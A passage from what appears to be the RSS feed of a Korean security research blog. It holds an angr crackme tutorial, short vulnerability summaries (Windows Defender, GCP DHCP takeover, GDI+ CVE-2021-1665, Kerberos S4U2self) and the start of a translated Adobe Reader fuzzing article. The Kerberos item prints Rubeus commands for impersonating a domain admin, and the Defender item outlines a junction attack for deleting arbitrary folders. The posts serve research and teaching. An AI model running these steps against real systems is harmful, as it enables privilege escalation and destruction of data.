(!(<span class="hljs-string">&#x27;A&#x27;</span> &lt;= value &amp;&amp; value &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>)) &#123;    printf(<span class="hljs-string">&quot;Try again.\\n&quot;</span>);    exit(<span class="hljs-number">1</span>);  &#125;  <span class="hljs-keyword">return</span> ((value - <span class="hljs-string">&#x27;A&#x27;</span> + (LAMBDA * i)) % (<span class="hljs-string">&#x27;Z&#x27;</span> - <span class="hljs-string">&#x27;A&#x27;</span> + <span class="hljs-number">1</span>)) + <span class="hljs-string">&#x27;A&#x27;</span>;&#125;int main(int argc, char* argv[]) &#123;  char buffer[<span class="hljs-number">9</span>];  //print_msg();  printf(<span class="hljs-string">&quot;Enter the password: &quot;</span>);  scanf(<span class="hljs-string">&quot;%8s&quot;</span>, buffer);  <span class="hljs-keyword">for</span> (int i=<span class="hljs-number">0</span>; i&lt;LEN_USERDEF; ++i) &#123;    buffer[i] = complex_function(buffer[i], i);  &#125;  <span class="hljs-keyword">if</span> (strcmp(buffer, USERDEF)) &#123;    printf(<span class="hljs-string">&quot;Try again.\\n&quot;</span>);  &#125; <span class="hljs-keyword">else</span> &#123;    printf(<span class="hljs-string">&quot;Good Job.\\n&quot;</span>);  &#125;&#125;</code></pre><p>코드를 보면 유저가 인풋을 넣으면 인풋을 바탕으로 어떤 연산 작업을 실행하고 그 결과 값을 컴파일 당시 랜덤하게 생성된 문자열과 비교하는 것을 알 수 있습니다. 그러면 우리가 해야하는 것은 연산 결과가 해당 문자열과 일치하는 인풋을 찾아야겠군요! 즉, main 함수에서 printf(“Good Job.\n”); 이 실행될 수 있도록 해야한다는 거죠. 쉽죠? 이정도는 angr한테는 껌이겠죠? 이제 위 코드를 컴파일하고 아래 코드를 돌려봅시다!</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>    proj = angr.Project(<span class="hljs-string">&#x27;00_angr_find&#x27;</span>)    init_state = proj.factory.entry_state()    simulation = proj.factory.simgr(init_state)    print_good = <span class="hljs-number">0x804867d</span>    simulation.explore(find=print_good)    <span class="hljs-keyword">if</span> simulation.found:        solution = simulation.found[<span class="hljs-number">0</span>]        print(<span class="hljs-string">&#x27;flag: &#x27;</span>, solution.posix.dumps(<span class="hljs-number">0</span>))    <span class="hljs-keyword">else</span>:        print(<span class="hljs-string">&#x27;no solution&#x27;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    main()</code></pre><p>컴파일된 바이너리를 IDA로 확인해서 printf(“Good Job.\n”);의 주소를 알아냅니다.(주소는 바뀔 수 있으니 각자 한번 확인해보세요) 그리고 simulation.explore(find=print_good)를 통해 값을 탐색합니다. 그리고 찾아지면 끝! 진짜 쉽죠? 아 물론 문제가 쉬워서 그럽니다 쿠쿸… 아직 이정도는 찍먹이라고 할 수도 없는 수준이죠.</p><h1 id="마무리…"><a href="#마무리…" class="headerlink" title="마무리…"></a>마무리…</h1><p>도대체 angr에서는 저 explore 함수에서 무슨 짓을 했길래 정답을 찾아낼 수 있었던 걸까요? 아마 여러분이 angr하면 떠오르는 키워드가 몇 가지 있을텐데, 바로 Symbolic Execution 덕분 입니다.</p><p>예… 다음 글 주제는 Symbolic Execution입니다!! 하하… 이번 편도 재미는 별로 없다고 생각이 드는데 다음 글은 어떡하지…하씨</p><p>그래도 마무리되었으니까 기쁜 마음으로 퇴근!!</p><p><img src="/2021/07/10/j0ker/angr_part1/1625731445.gif" alt="4"></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/angr/">angr</category>
      
      <category domain="https://hackyboiz.github.io/tags/exploit/">exploit</category>
      
      <category domain="https://hackyboiz.github.io/tags/symbolic-execution/">symbolic_execution</category>
      
      <category domain="https://hackyboiz.github.io/tags/newbie/">newbie</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/10/j0ker/angr_part1/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] mpengine: asprotect embedded runtime dll memory corruption</title>
      <link>https://hackyboiz.github.io/2021/07/09/j0ker/2021-07-09/</link>
      <guid>https://hackyboiz.github.io/2021/07/09/j0ker/2021-07-09/</guid>
      <pubDate>Fri, 09 Jul 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://bugs.chromium.org/p/project-zero/issues/det</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2189">https://bugs.chromium.org/p/project-zero/issues/detail?id=2189</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows Defender</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows Defender는 여느 안티바이러스와 같이 수 많은 포맷을 분석 및 검사할 수 있는 메커니즘을 가지고 있습니다. 2018년, 마이크로소프트는 Defender를 샌드박싱한다고 밝혔지만 디폴트로 설정되어 있지는 않습니다. 따라서 Defender에서 파일을 분석할 때, 파일 파서, 언패커, 인터프리터 그리고 에뮬레이터는 여전히 SYSTEM 권한으로 실행됩니다.</p><p>이 취약점은 Denfender에서 <code>ASProtect</code>로 패킹된 바이너리를 언패킹할 때 발생합니다. Defender에서는 패킹된 바이너리를 분석할 때, 패커의 파일 포맷를 바탕으로 바이너리에서 정보를 파싱하는게 아니라 에뮬레이터를 통해 바이너리를 실행하여 바이너리가 알아서 언패킹하도록 유도합니다. <code>ASProtect</code>는 언패킹 과정에서 내재된 DLL을 파일시스템에 떨구고, 해당 DLL을 에뮬레이터로 활용하여 메인 바이너리 안에 있는 바이트 코드를 실행하면서 언패킹을 진행합니다. 에뮬레이터로 활용되는 DLL 역시 패킹이 되어 있지만 특별한 검사는 하지 않습니다. 취약점은 바로 이 DLL의 <code>IMAGE_SECTION_HEADER</code> 구조체를 파싱할 때 발생합니다.</p><pre><code class="hljs c++">NtHdr = (IMAGE_NT_HEADERS *)((<span class="hljs-keyword">char</span> *)ImagePtr + ImagePtr-&gt;e_lfanew);NtHdr-&gt;OptionalHeader.SizeOfImage = <span class="hljs-keyword">this</span>-&gt;ImageSize;NtHdr-&gt;OptionalHeader.ImageBase = <span class="hljs-keyword">this</span>-&gt;ImageBase;NtHdr-&gt;OptionalHeader.AddressOfEntryPoint = <span class="hljs-keyword">this</span>-&gt;EntryPoint;NtHdr-&gt;OptionalHeader.SizeOfHeaders = <span class="hljs-number">4096</span>;TotalSects = <span class="hljs-keyword">this</span>-&gt;LastSection - <span class="hljs-keyword">this</span>-&gt;FirstSection) / <span class="hljs-keyword">sizeof</span>(EMBEDDED_SECTION);<span class="hljs-comment">// ...</span><span class="hljs-keyword">do</span>&#123;  SectHdrs-&gt;VirtualAddress = *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">char</span> *)&amp;<span class="hljs-keyword">this</span>-&gt;FirstSection-&gt;VirtualAddress + Offset);  SectHdrs-&gt;PointerToRawData = *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">char</span> *)&amp;<span class="hljs-keyword">this</span>-&gt;FirstSection-&gt;VirtualAddress + Offset);  <span class="hljs-comment">//  IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE</span>  SectHdrs-&gt;Characteristics = <span class="hljs-number">0xE0000020</span>;  CurrSect = (EMBEDDED_SECTION *)((<span class="hljs-keyword">char</span> *)<span class="hljs-keyword">this</span>-&gt;FirstSection + Offset);  <span class="hljs-keyword">if</span> ( SectNum &gt;= NumSects )    EndAddress = <span class="hljs-keyword">this</span>-&gt;ImageSize;  <span class="hljs-keyword">else</span>    EndAddress = CurrSect[<span class="hljs-number">1</span>].VirtualAddress;  VirtualSize = EndAddress - CurrSect-&gt;VirtualAddress;  SectHdrs-&gt;Misc.VirtualSize = VirtualSize;  SectHdrs-&gt;SizeOfRawData = VirtualSize;  StringCchPrintfA((<span class="hljs-keyword">char</span> *)SectHdrs, <span class="hljs-number">8u</span>, <span class="hljs-string">&quot;.sect%d&quot;</span>, SectNum);  memcpy_s_0(    &amp;<span class="hljs-keyword">this</span>-&gt;ImagePtr[*(<span class="hljs-keyword">int</span> *)(&amp;<span class="hljs-keyword">this</span>-&gt;FirstSection-&gt;VirtualAddress + Offset)],    <span class="hljs-keyword">this</span>-&gt;ImageSize - *(<span class="hljs-keyword">int</span> *)(&amp;<span class="hljs-keyword">this</span>-&gt;FirstSection-&gt;VirtualAddress + Offset),    *(<span class="hljs-keyword">void</span> **)(&amp;<span class="hljs-keyword">this</span>-&gt;FirstSection-&gt;PointerToData + Offset),    *(<span class="hljs-keyword">int</span> *)(&amp;<span class="hljs-keyword">this</span>-&gt;FirstSection-&gt;SectSize + Offset));</code></pre><p>위 코드에서는 DLL에 저장된 <code>RVA(Relative Virtual Address)</code>를 아무런 검증 없이 가져옵니다. 그런 다음, 이를 마지막 <code>memcpy</code>에서 버퍼의 오프셋으로 사용하는데, 이 때 임의로 넣은 <code>RVA</code> 값을 통해 원하는 오프셋을 읽거나 쓸 수 있습니다. 익스플로잇이 될 경우, 이 작업은 에뮬레이터에서 진행되기 때문에 에뮬레이터 밖의 메모리를 읽거나 쓸 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/defender/">defender</category>
      
      <category domain="https://hackyboiz.github.io/tags/antivirus/">antivirus</category>
      
      <category domain="https://hackyboiz.github.io/tags/unpacking/">unpacking</category>
      
      <category domain="https://hackyboiz.github.io/tags/arbitrary-read-write/">arbitrary_read_write</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/09/j0ker/2021-07-09/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] GCP VM takeover via DHCP flood attack</title>
      <link>https://hackyboiz.github.io/2021/07/08/fabu1ous/2021-07-08/</link>
      <guid>https://hackyboiz.github.io/2021/07/08/fabu1ous/2021-07-08/</guid>
      <pubDate>Thu, 08 Jul 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/irsl/gcp-dhcp-takeover-code-exec&quot;&gt;gcp-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/irsl/gcp-dhcp-takeover-code-exec">gcp-dhcp-takeover-code-exec</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Google’s Comput Engine Platform</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p><strong>아직 패치되지 않은 취약점입니다.</strong></p><p>ISC DHCP가 사용하는 랜덤 로직에서 취약점이 발견되었습니다. 해커는 이를 악용해 자신을 Metadata server로 가장하고 Google Cloud Platform(GCP)의 가상 머신(VM: Virtual Machine)을 장악할 수 있습니다.</p><p>ISC DHCP 클라이언트는 random() 함수를 통해 유사 난수를 생성합니다. 난수의 seed는 다음과 같은 3가지 값을 조합해 사용하는데, 유효한 범위 내에서 XID 예측이 가능해 dhcilent에 DHCP packet을 보낼 수 있습니다.</p><ul><li>프로세스가 시작된 시점의 unixtime</li><li>dhclient 프로세스의 pid</li><li>네트워크 인터페이스 카드 이더넷 주소(MAC)의 마지막 4 byte</li></ul><p>GCP VM은 ssh 공개키 분배와 같은 초기 설정 작업을 Metadata server에 크게 의존합니다. XID을 유추한 해커는 VM이 네트워크를 재설정하도록 유도할 수 있고 그 과정에서 자신을 Metadata server로 속여 원하는 ssh 공개키를 VM에 전달할 수 있습니다. 이후 해커는 ssh를 통해 원격 쉘에 자유자재로 접근할 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/gcp/">gcp</category>
      
      <category domain="https://hackyboiz.github.io/tags/dhcp/">dhcp</category>
      
      <category domain="https://hackyboiz.github.io/tags/random/">random</category>
      
      <category domain="https://hackyboiz.github.io/tags/network/">network</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/08/fabu1ous/2021-07-08/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-1665: Windows 그래픽 드라이버 원격 코드 실행 취약점</title>
      <link>https://hackyboiz.github.io/2021/07/06/l0ch/2021-07-06/</link>
      <guid>https://hackyboiz.github.io/2021/07/06/l0ch/2021-07-06/</guid>
      <pubDate>Tue, 06 Jul 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.mcafee.com/blogs/other-blogs/mcafee-labs/anal</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.mcafee.com/blogs/other-blogs/mcafee-labs/analyzing-cve-2021-1665-remote-code-execution-vulnerability-in-windows-gdi/">Analyzing CVE-2021-1665 – Remote Code Execution Vulnerability in Windows GDI+</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows의 그래픽 장치 인터페이스(Graphic Device Interface, GDI)에서 발견된 원격 코드 실행 취약점의 세부 정보가 공개되었습니다.</p><p>취약점은 <code>gdiplus.dll</code> 에서 EMF 파일을 파싱 할 때 발생합니다.</p><blockquote><p>EMF : WMF 파일의 확장으로 응용프로그램에서 이미지 또는 그래픽을 렌더링 할 수 있도록 하는 메타 파일</p></blockquote><p><code>Builtline::BuildAllLines</code> 함수에는 다음 루프 프로세스가 존재합니다.</p><ol><li><code>0x60</code> bytes 크기의 메모리를 할당</li><li><code>Builtline::BuiltLine</code>를 호출해 할당된 메모리에 데이터 복사</li><li><code>BuiltLine::GetUntrimmedCharacterCount</code> 함수를 호출하고 해당 함수의 반환 값(1)을 루프 카운터 더함</li><li>루프 카운터가 EMF 파일의 <code>Length</code> 필드보다 크면 루프 종료</li></ol><p>그러나 <code>BuiltLine::GetUntrimmedCharacterCount</code> 함수의 반환 값이 0이 되는 경우를 처리하는 코드가 없어 지정된 <code>Length</code> 필드 값 이상으로 루프가 실행되고 이는 데이터 손상과 원격 코드 실행으로 이어질 수 있습니다.</p><p>Microsoft는 <code>BuiltLine::GetUntrimmedCharacterCount</code> 함수의 반환 값을 확인하는 검사를 추가한 패치를 배포하였습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/gdi/">gdi</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/06/l0ch/2021-07-06/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Abusing Kerberos S4U2self local privilege escalation</title>
      <link>https://hackyboiz.github.io/2021/07/05/idioth/2021-07-05/</link>
      <guid>https://hackyboiz.github.io/2021/07/05/idioth/2021-07-05/</guid>
      <pubDate>Mon, 05 Jul 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://cyberstoph.org/posts/2021/06/abusing-kerberos-s4u</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://cyberstoph.org/posts/2021/06/abusing-kerberos-s4u2self-for-local-privilege-escalation/">Abusing Kerberos S4U2self for local privilege escalation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Kerberos S4U2self</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>티켓을 기반으로 동작하는 컴퓨터 네트워크 인증 암호화 프로토콜 Kerberos의 <a href="http://www.harmj0y.net/blog/activedirectory/S4U2pwnage/">S4U2self extension을 악용</a>하여 권한 상승이 가능합니다. 해당 기술은 새로 발견된 것은 아니며 <a href="https://github.com/GhostPack/Rubeus#constrained-delegation-abuse">Rubeus manual</a>과 <a href="https://exploit.ph/revisiting-delegate-2-thyself.html">Charlie Clark의 게시글</a>에서 상세 내용을 확인할 수 있습니다.</p><p>S4U2proxy와 관련된 시스템 간에 작업은 권한을 가진 계정이 활성화 되어 있어야 하지만, SPN을 사용하는 모든 사용자는 S4U2self를 호출할 수 있습니다. Active Directory에서 네트워크 서비스 계정과 AppPool identities는 컴퓨터 계정의 역할을 할 수 있습니다. 따라서 네트워크 서비스 계정으로 실행되는 MSSQL이나, AppPool을 사용하는 IIS 등이 실행 중일 경우 S4U2self를 호출하여 모든 유저가 자신의 서비스 티켓을 요청할 수 있습니다. 이를 통해 권한 상승을 하는 방법은 다음과 같습니다.</p><ol><li>TGT 가져오기</li></ol><p>S4U2self를 호출하기 위해서는 TGT 또는 컴퓨터 계정의 자격 증명이 필요합니다. 컴퓨터 계정의 TGT는 Rubues의<code>tgt::deleg</code> trick을 통해 가져올 수 있습니다.</p><pre><code class="hljs cmake">Invoke-Rubeus -<span class="hljs-keyword">Command</span> <span class="hljs-string">&quot;tgtdeleg /nowrap&quot;</span></code></pre><ol start="2"><li>SPN 수정</li></ol><p>위의 TGT를 사용하여 S4U2self를 호출하여 도메인 관리자에 대한 티켓을 요청할 수 있습니다. </p><pre><code class="hljs cmake">Invoke-Rubeus -<span class="hljs-keyword">Command</span> <span class="hljs-string">&quot;s4u /self /nowrap /impersonateuser:doadmin /ticket:base64blob&quot;</span></code></pre><p>기본적으로 S4U2self를 통해 가져온 티켓의 SPN은 해커가 실행 중인  <code>Computername$</code>으로 설정되어 있습니다. 따라서 유효한 SPN이 아니므로 티켓을 사용할 수 없지만, <code>tgssub</code>와 <code>/altservice</code>를 사용하여 해당 부분을 수정할 수 있습니다.</p><pre><code class="hljs cmake">Invoke-Rubeus -<span class="hljs-keyword">Command</span> <span class="hljs-string">&quot;tgssub /altservice:http/adsec-00.contoso.com /ticket:base64blob&quot;</span></code></pre><p>그 후 다른 호스트에서 티켓을 복사해 사용할 수 있습니다.</p><p><img src="https://cyberstoph.org/img/7_tgssub_ptt_2.png" alt="tgtdeleg"></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/kerberos/">kerberos</category>
      
      <category domain="https://hackyboiz.github.io/tags/s4u2self/">s4u2self</category>
      
      <category domain="https://hackyboiz.github.io/tags/rubeus/">rubeus</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/05/idioth/2021-07-05/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-1170 - Microsoft Windows Defender Elevation of Privilege Vulnerability</title>
      <link>https://hackyboiz.github.io/2021/07/04/j0ker/2021-07-04/</link>
      <guid>https://hackyboiz.github.io/2021/07/04/j0ker/2021-07-04/</guid>
      <pubDate>Sun, 04 Jul 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://itm4n.github.io/cve-2020-1170-windows-defen</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://itm4n.github.io/cve-2020-1170-windows-defender-eop/">https://itm4n.github.io/cve-2020-1170-windows-defender-eop/</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows Defender</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows Defender는 두 가지 로그 파일, <code>MpCmdRun.log</code>와 <code>MpSigStub.log</code>를 사용하는데 이 둘 모두 <code>C:\Windows\Temp</code>에 저장합니다. 일반 유저 권한에서는 이 두 파일에 대한 Write 권한은 없지만 <code>C:\Windows\Temp</code>에 자유롭게 파일이나 디렉터리를 생성할 수 있습니다.</p><p>두 로그 파일 중 <code>MpCmdRun.log</code> 파일이 16MB보다 커지면, Windows Defender는 SYSTEM 권한으로 해당 파일의 이름을 <code>MpCmdRum.log.bak</code>으로 수정하고 같은 이름의 새로운 파일을 생성합니다. 하지만 <code>MpCmdRun.log.bak</code>이 존재하고 폴더라면, 폴더 안에 있는 파일들과 해당 폴더를 삭제하고 로그 파일을 생성합니다.</p><p>이 취약점을 트리거하기 위해서는 먼저 원하는 <code>MpCmdRun.log.bak</code>이라는 이름으로 삭제하고 싶은 폴더를 가리키는 Junction 폴더를 <code>C:\Windows\Temp</code>에 생성합니다. <code>Update-MpSignature -UpdateSource InternalDefinitionUpdateServer</code> 명령어를 40분 동안 무한반복 실행하여 <code>MpCmdRun.log</code>가 16MB보다 커지게 하면 취약점이 트리거 되어 원하는 폴더 및 그 아래 파일들을 지울 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/defender/">defender</category>
      
      <category domain="https://hackyboiz.github.io/tags/file-deletion/">file_deletion</category>
      
      <category domain="https://hackyboiz.github.io/tags/directory-deletion/">directory_deletion</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/04/j0ker/2021-07-04/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Translation] 50 CVEs in 50 Days: Fuzzing Adobe Reader</title>
      <link>https://hackyboiz.github.io/2021/07/04/fabu1ous/50cve/</link>
      <guid>https://hackyboiz.github.io/2021/07/04/fabu1ous/50cve/</guid>
      <pubDate>Sun, 04 Jul 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;번역-추신&quot;&gt;&lt;a href=&quot;#번역-추신&quot; class=&quot;headerlink&quot; title=&quot;번역 추신&quot;&gt;&lt;/a&gt;번역 추신&lt;/h1&gt;&lt;p&gt;WinAFL 연구글을 쓰면서 타겟함수 찾기 위해 분석하는 방식을 좀 더 공부하기 위해 읽은 글입니다. 참</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="번역-추신"><a href="#번역-추신" class="headerlink" title="번역 추신"></a>번역 추신</h1><p>WinAFL 연구글을 쓰면서 타겟함수 찾기 위해 분석하는 방식을 좀 더 공부하기 위해 읽은 글입니다. 참 애매한 주제인 게 타겟 분석을 너무 많이하면 퍼징을 하는 의미가 없어지고 그렇다고 분석을 너무 적게 하면 Harness 작성 및 퍼징을 돌리는 거 자체가 번거워집니다. 그 사이 어딘가 적정 선을 찾는 것이 중요한데 이 글이 도움이 될 거라 생각합니다. 이 글을 따라서 직접 실습해보고 재구성한 연구글을 업로드할 생각이었지만 종강 기념으로 놀다 와서 진득하게 연구글을 쓸 시간이 없었습니다. ㅎㅎ 그래서 일단 번역글을 올립니다. 현재 업로드 중인 WinAFL 시리즈의 다음 글은 이번 번역글을 좀 더 깊게 공부해보고 작성하겠습니다.</p><p>원본글 :  <a href="https://research.checkpoint.com/2018/50-adobe-cves-in-50-days/">https://research.checkpoint.com/2018/50-adobe-cves-in-50-days/</a></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>2017년에 큰 변화가 있었습니다. 그 해에 보고된 새로운 취약점의 수는 약 14,000개로, 전년보다 두 배 이상 많습니다. 아마 그 이유는 자동 취약점 탐색 툴인 “퍼저”의 인기가 높아졌기 때문일 겁니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/1.png"></p><p>퍼저 자체는 20년 이상 존재해 왔고 그리 새로운 기술은 아닙니다. 하지만 주목해야 할 사실은 퍼저들이 발전했다는 겁니다. 그들은 더욱 뛰어난 기능과 쉬운 접근성을 가지게 됐으며 무엇보다 완성도가 높아졌습니다. 그럼에도 불구하고, 퍼저를 사용하는 것은 “어두운 예술”이라는 평판을 가지고 있기 때문에 많은 연구자들은 퍼저를 사용하는 것을 꺼려합니다.</p><p>위의 모든 것을 고려해 볼 때, 다음과 같은 질문을 해볼 수 있습니다. “더 많은 연구자들이 더 많은 취약점을 찾기 위해 퍼저를 사용하고 있다. 하지만 <em>모든</em> 연구자들이 <em>모든</em> 취약점을 찾기 위해 퍼저를 사용하고 있을까?” “FUZZ라고 적힌 커다란 버튼을 누르기만 하면 찾을 수 있는, 거저먹을 수 있는 취약점들이 얼마나 있을까?”</p><p>그 답을 알기 위해, 저희는 저희가 생각할 수 있는 가장 흔한 실험을 만들었습니다. 가장 일반적인 Windows 퍼징 프레임워크 중 하나인 WinAFL과 세계에서 가장 인기 있는 소프트웨어 제품 중 하나인 Adobe Reader를 사용했습니다. 저희는 코드를 분석하고, 취약점이 있을 만한 라이브러리를 찾아 harness를 작성하고, 마지막으로 퍼징 등 전체 작업에 50일의 기간을 설정했습니다.</p><p>결과는 매우 충격적이었습니다. 50일 동안 Adobe Reader에서 50개 이상의 새로운 취약점을 발견할 수 있었습니다. 이는 하루 평균 1개의 취약점으로, 이러한 유형의 연구에서는 흔하지 않은 속도입니다.</p><p>이 글을 통해 해당 연구의 전말을 알려드리려 합니다. 검색 범위를 넓히기 위해 사용한 새로운 방법론, WinAFL을 개선한 방법, 그리고 마지막으로 그 과정에서 얻은 지식을 공유하려 합니다.</p><h1 id="What-is-WinAFL"><a href="#What-is-WinAFL" class="headerlink" title="What is WinAFL?"></a>What is WinAFL?</h1><p>AFL은 coverage guided genetic fuzzer로, 실제 프로그램에서 버그를 찾는 데 매우 영리한 휴리스틱을 갖고 있습니다.</p><p>WinAFL은 Windows용 AFL로 Ivan Fratric(Google Project Zero)에 의해 만들어지고 관리되고 있습니다. Closed source 바이너리를 타겟으로 한 여러 instrumentation을 사용합니다.</p><p>우선 AFL이 어떻게 동작하는지 자세하게 적혀있는 AFL 기술 문서를 읽는 것을 추천합니다. 또한 단점을 지적하고 문제가 발생했을 때 디버깅할 수 있도록 도와줍니다.</p><p>WinAFL은 압축 바이너리 형식(이미지, 비디오, 아카이브)의 파일 포맷 버그를 찾는데 매우 효과적입니다.</p><h1 id="Attacking-Acrobat-Reader-DC"><a href="#Attacking-Acrobat-Reader-DC" class="headerlink" title="Attacking Acrobat Reader DC"></a>Attacking Acrobat Reader DC</h1><p>우선 메인 바이너리 AcroRd32.exe부터 시작해 봅시다.  AcroRD32.dll 주변의 (상대적으로) 얇은 wrapper이며 대략 30MB입니다. AcroRD32.dll은 많은 코드가 있습니다. 그중 일부는 PDF 오브젝트에 대한 파서가 포함되어 있고 대부분은 GUI 코드(일반적으로 GUI 코드에선 버그를 찾지 않음)입니다.</p><p>WinAFL은 바이너리 포맷에 효과적이므로 특정 파서를 공격하는데 집중하기로 했습니다. 문제는 파서를 찾아서 파서를 위한 harness를 작성하는 것입니다. Harness란 정확히 무엇인지 잠시 후에 설명하겠습니다.</p><p>전체 Reader 프로세스를 로드하지 않고도 로드할 수 있는 바이너리 포맷의 파서를 찾아야 합니다.</p><p>Acrobat의 폴더에서 DLL을 탐색한 결과 JP2KLib.dll이 이상적인 타겟임을 확인했습니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/2.png"></p><p>JP2KLib.dll은 JPEG2000 포맷의 파서로 상당히 유용한 함수를 export 합니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/3.png"></p><p>이번 연구의 타겟은 다음과 같습니다.</p><p>Acrobat Reader DC ≤ 2018.011.238</p><p>JP2KLib.dll 1.2.2.39492</p><h1 id="What-is-a-Target-Function"><a href="#What-is-a-Target-Function" class="headerlink" title="What is a Target Function?"></a>What is 